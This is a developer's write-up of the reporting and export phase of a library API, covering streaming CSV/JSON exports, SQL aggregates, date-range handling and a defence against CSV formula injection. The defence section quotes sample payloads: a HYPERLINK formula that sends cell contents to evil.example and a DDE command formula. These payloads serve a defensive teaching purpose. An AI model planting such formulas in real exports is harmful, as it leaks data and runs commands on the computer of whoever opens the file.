# Phase 7 — Reports & Export

**Goal:** get data out of the system without buffering it — and without handing
the person who opens the file an attack.

---

## What we built

- `GET /api/reports/books/export` — the catalogue, CSV or JSON
- `GET /api/reports/loans` — lending history, filtered by date, status, member
- `GET /api/reports/overdue` — what is late now, with projected fines
- `GET /api/reports/fines/summary` — aggregated totals, computed in SQL
- `CsvFieldEncoder` — formula-injection defence, with 12 tests
- `IReportExporter` with CSV and JSON implementations

---

## Concepts

### 1. CSV formula injection — the security item

This is the one to understand. It is a genuine vulnerability, and the shape of it
is unusual.

**The attack.** A book is catalogued with this title:

```
=HYPERLINK("https://evil.example/?d="&A1&A2&A3,"Click for details")
```

Nothing is injected into *this* system. The title is stored faithfully, every
query is parameterised, and `GET /api/books/27` returns exactly what was sent.

The vulnerability is in the **export**. Excel, LibreOffice Calc and Google Sheets
treat a cell beginning `=`, `+`, `-` or `@` as a formula. So the file this
application writes becomes a working exfiltration link in the librarian's
spreadsheet, leaking neighbouring cells the moment it is clicked. Worse variants
reach DDE:

```
=cmd|'/c calc'!A0
```

which older Excel configurations execute after a prompt most users click through.

> **This application writes a file that another application executes.** A server
> that only defends its own process hands the attack to whoever opens the
> download.

**The fix.** A leading apostrophe forces the spreadsheet to treat the cell as
text:

```csharp
private static readonly char[] FormulaTriggers = ['=', '+', '-', '@'];
```

`-` is included because `-1+1` is arithmetic. `@` is Lotus-era syntax that Excel
still honours, and it is the one most commonly missed.

**Quoting is not a defence.** This is the subtlety:

```csharp
_encoder.Encode("=1+1,2").ShouldBe("\"'=1+1,2\"");     // apostrophe INSIDE
_encoder.Encode("=1+1,2").ShouldNotBe("\"=1+1,2\"");   // quoting alone is useless
```

Excel strips the surrounding quotes and then evaluates what is inside. RFC 4180
quoting is *structural* — it stops a comma breaking the file — and does nothing
about formulas. The apostrophe has to go inside.

**Leading control characters too.** Some parsers strip a leading tab or carriage
return *before* deciding whether a cell is a formula, so `"\t=1+1"` evaluates.
Both are treated as triggers.

**The cost, documented rather than hidden.** A legitimate title beginning with a
hyphen — `-40 Degrees` — shows a stray apostrophe in Excel. That is the accepted
trade: a cosmetic blemish on rare rows against arbitrary formula execution on the
rest. A test asserts it, so it is a decision rather than a surprise.

**JSON deliberately does not escape.**

```csharp
// JsonReportExporter — no encoder, and that is correct
```

A spreadsheet never opens JSON. Prefixing values with an apostrophe would corrupt
the data for every legitimate consumer. **A defence applied where the threat does
not exist is a bug**, not extra safety. Twelve tests pin both behaviours.

---

### 2. Streaming out, as the import streams in

```csharp
IAsyncEnumerable<BookExportRow> StreamBooksAsync(...);   // repository
Task WriteAsync<T>(Stream destination, IAsyncEnumerable<T> rows, ...);   // exporter
```

`AsAsyncEnumerable()` rather than `ToListAsync()`: EF Core reads from the open
data reader as the consumer pulls, so the client starts downloading while the
database is still producing rows.

**This is the one place the "no `IQueryable` escapes the repository" rule bends**,
and it is worth being explicit about why. A report is unbounded by definition — a
200,000-row catalogue export materialised into a `List` allocates every row before
the first byte is sent. `IAsyncEnumerable` keeps the streaming without leaking
composability: a caller can enumerate it but cannot append a `Where` and change
the query. The abstraction that mattered is preserved; only the buffering is gone.

---

### 3. Why the controllers return `EmptyResult`

```csharp
Response.ContentType = descriptor.ContentType;
Response.Headers.ContentDisposition = $"attachment; filename=\"{descriptor.FileName}\"";
await write(Response.Body, cancellationToken);
return new EmptyResult();
```

A `FileResult` takes a completed byte array or stream — the whole report has to
exist before anything is sent, which defeats the point.

**The cost is stated in the controller**, because it is genuinely a trade:

> Headers must be set *before* the first byte is written — once the response has
> started, changing the status code is impossible, so an error mid-stream
> truncates the file rather than producing a clean 500.

That is right for a report and wrong for almost anything else. It also stopped
being theoretical within an hour — see below.

---

### 4. Aggregates belong in the database

```csharp
var totals = await query
    .GroupBy(_ => 1)
    .Select(g => new
    {
        Count = g.Count(),
        Assessed = g.Sum(f => f.Amount),
        Paid = g.Sum(f => f.PaidAt != null ? f.Amount : 0m),
        Outstanding = g.Sum(f => f.PaidAt == null && f.WaivedAt == null ? f.Amount : 0m),
        // ...
    })
    .FirstOrDefaultAsync(ct);
```

One round trip for every headline figure. Loading the fine rows and summing them
in C# returns the same answer and transfers the entire table to get it — the
difference between a report that works on seed data and one that works in
production. Six separate queries would be six round trips for one screen.

**Noted in passing:** `Fine` has no `AssessedAt`, so `CreatedAt` is the assessment
time. That holds only because a `Fine` row comes into existence when the handler
assesses it. If fines ever become creatable ahead of assessment, this filter
silently starts answering a different question — the comment in the repository
says so.

---

### 5. Date ranges are inclusive at both ends

```csharp
private static DateTimeOffset ToEndOfDay(DateOnly date) =>
    new(date.ToDateTime(TimeOnly.MaxValue), TimeSpan.Zero);
```

Using midnight for `to` silently excludes everything that happened on the final
day — the off-by-one that makes a month-end report miss the month's last day.

`asOf` on the overdue report gets the same treatment, so a loan due at 09:00 on
the 5th counts as overdue when asking about the 5th.

**An inverted range is refused**, not clamped:

```
from=2030-01-01&to=2000-01-01   →   422 report.invalid_date_range
```

Page numbers get clamped because there is a sensible value to clamp to. An
inverted range has none, and the empty report it would otherwise produce is
indistinguishable from "nothing happened in that period" — a real answer to a
question nobody asked.

---

### 6. Formatting: invariant culture, everywhere

```csharp
public static string Money(decimal value) => value.ToString("0.00", CultureInfo.InvariantCulture);
public static string Date(DateOnly? v) => v?.ToString("yyyy-MM-dd", CultureInfo.InvariantCulture) ?? "";
```

A report formatted in the server's culture is a file whose meaning depends on
where it was generated: `1,234.50` in one locale and `1.234,50` in another, both
written to a column someone's script parses as a number. And `03/04/2024` is
March in the US and April in the UK, with nothing in the file to say which.

No currency symbol, either — it would make the column non-numeric to every
consumer. Currency is a property of the whole report, not of each cell, and is
stated in the summary's `currency` field.

---

### 7. UTF-8 **with** a BOM

```csharp
private static readonly UTF8Encoding Utf8WithBom = new(encoderShouldEmitUTF8Identifier: true);
```

A BOM is unwanted in most modern contexts and required here. Excel on Windows
opens a BOM-less CSV as the system ANSI code page, so `José` arrives as `JosÃ©`.
The BOM is what tells Excel the file is UTF-8.

The trade: some strict parsers surface the BOM as stray characters on the first
header. These files are opened in a spreadsheet far more often than parsed by a
script, and mangled names are the worse failure.

---

## Things that bit us

### `EF.Functions.DateDiffDay` is SQL Server only — and it failed *mid-stream*

The first version computed overdue days in SQL:

```csharp
DaysOverdue = EF.Functions.DateDiffDay(l.DueAt, asOf)   // SQL Server only
```

The SQLite provider cannot translate it. The query silently switched to client
evaluation and then threw — **after the first row had already been written to the
response.**

The symptom was a loans export containing a header and one row, with `HTTP 200`
and no error visible to the client at all. The file was simply short. Only the
server log showed:

```
System.InvalidOperationException: The 'DateDiffDay' method is not supported
because the query has switched to client-evaluation.
```

This is exactly the failure the dual-provider rule exists to catch: **code that
works on one database and not the other.** And it demonstrated the streaming
trade-off documented in the controller within an hour of that comment being
written — a mid-stream error truncates rather than failing cleanly.

**The fix.** Date *comparisons* translate on both providers; only the arithmetic
did not. `DaysOverdue` and `ProjectedFine` became computed properties on the
export rows, derived from the dates and the `asOf` instant:

```csharp
public int DaysOverdue
{
    get
    {
        DateTimeOffset endpoint = ReturnedAt ?? AsOf;
        return endpoint <= DueAt ? 0 : (int)(endpoint.Date - DueAt.Date).TotalDays;
    }
}
```

O(1) per row, streaming intact, nothing provider-specific left in the query.
After the fix the loans export returned all 5 rows instead of 1.

**The lesson:** an `IQueryable` that compiles is not an `IQueryable` that
translates, and the failure can arrive after the response has started.

### A test assertion that was too strict

`A_leading_control_character_before_a_trigger_is_also_neutralised` asserted the
encoded value starts with `'`. It fails for `"\r=1+1"` — the carriage return
triggers RFC 4180 quoting, so the result is `"'\r=1+1"` and starts with a quote.

Both cases are correctly disarmed; the apostrophe is simply inside the quotes,
which is where it belongs. The test now checks the first character ignoring an
opening quote, and says why.

---

## SOLID in this phase

| Principle | Where |
|---|---|
| **S** | `CsvFieldEncoder` does one thing. It knows nothing about books, loans, or streams |
| **O** | `ReportExporterFactory` indexes exporters by format — the same shape as the import readers |
| **L** | **The clearest example in the codebase.** Both exporters honour the same contract: consume the sequence once, write to the stream, never buffer, never dispose. A caller swaps CSV for JSON by changing an enum — *including* the streaming guarantee, which an implementation that quietly buffered would violate while still compiling |
| **I** | `IExportableRow` has two members. The exporters never learn what a book is |
| **D** | `Library.Application` declares the exporter interfaces; `Utf8JsonWriter` and the CSV writing live in Infrastructure |

---

## Verification

```bash
# Catalogue a book whose title is a formula, then export
curl "http://localhost:5112/api/reports/books/export" -o books.csv
grep HYPERLINK books.csv
```

```
27,9780306406157,"'=HYPERLINK(""https://evil.example/?d=""&A1,""Click me"")",...
```

Apostrophe inside the quotes; quotes doubled per RFC 4180. The same book via
`?format=Json` is untouched, and `GET /api/books/27` still returns the original
string — **escaped at the boundary where the threat exists, not corrupted at
rest.**

| Check | Result |
|---|---|
| `GET /api/reports/loans` | 5 rows, statuses `Active`/`Overdue`/`Returned` |
| `GET /api/reports/overdue` | 2 rows — 61 and 16 days late |
| Projected fines | `3050.00` and `800.00` — 61 × 50 and 16 × 50 |
| `?asOf=2026-08-01` | 1 row · `?asOf=2027-06-01` → 3 rows |
| Return the 16-day loan | Fine of `800.00` assessed |
| `GET /api/reports/fines/summary` | `totalAssessed=800`, `outstanding=800`, monthly breakdown |
| `from=2030&to=2000` | `422 report.invalid_date_range` |
| `Content-Disposition` | `attachment; filename="overdue-2026-09-14.csv"` |

---

## Questions you should be able to answer

1. What is CSV formula injection, and why is it a vulnerability in *this* system
   when nothing is injected into this system?
2. Why does the apostrophe go inside the RFC 4180 quotes rather than outside?
3. Why does the JSON exporter deliberately *not* escape?
4. Why do the export controllers return `EmptyResult` rather than `FileResult`,
   and what does that cost?
5. Why does the repository return `IAsyncEnumerable` when the rule says
   `IQueryable` never escapes?
6. Why did `DateDiffDay` produce a truncated file with a 200 status rather than
   an error?
7. Why is `to` converted to the end of the day rather than midnight?
8. Why is an inverted date range refused when an out-of-range page number is
   clamped?
9. Why is the CSV written with a BOM when a BOM is usually unwanted?

---

## What remains

- No integration test covers an export endpoint. Everything above was verified by
  hand — see the Testing section of the README for the full, deliberate gap.
- Phase 8 revisits the export surface: these endpoints are unauthenticated, and
  the overdue report carries member email addresses and phone numbers.
